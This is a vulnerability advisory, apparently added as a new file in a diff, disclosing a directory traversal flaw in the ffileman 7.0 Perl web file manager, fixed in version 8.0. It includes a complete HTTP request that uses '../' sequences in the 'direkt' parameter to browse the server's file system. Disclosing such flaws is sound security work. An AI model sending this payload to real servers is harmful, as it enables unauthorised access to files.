@@ -1,0 +1,53 @@
+Advisory:
+ffileman 7.0 Directory Traversal Vulnerability
+
+Credits: 
+Raffaele Forte 
+http://www.backbox.org
+
+Tested Versions: 
+ffileman 7.0
+
+Software Link: 
+http://sourceforge.net/projects/f-fileman/
+
+Tested on: 
+Unix
+
+Category: 
+Directory Traversal
+
+Severity: 
+Medium
+
+
+Description:
+
+Directory traversal vulnerabilities has been found in ffileman 7.0 a web 
+based file and directory manager written with Perl.
+
+The vulnerability can be exploited to access local files by entering 
+special characters in variables used to create file paths. The attackers 
+use “../” sequences to move up to root directory, thus permitting 
+navigation through the file system.
+
+The issue discovered can only be exploited with an authenticated session 
+and setting the variable "direkt" like below with a HTTP GET or POST 
+request.
+
+
+Request:
+
+GET http://[webserver IP]/cgi-bin/ffileman.cgi?direkt=../../../../../../../../&kullanici=[username]&sifre=[password]&dizin_git=Vai%20alla%20Directory HTTP/1.1
+Host: [webserver IP]
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Proxy-Connection: keep-alive
+Referer: http://[webserver IP]/cgi-bin/ffileman.cgi?direkt=[original path]&kullanici=[username]&sifre=[password]&dizin_git=Vai%20alla%20Directory
+
+
+Disclosure:
+2009-07-17 Fixed with version 8.0
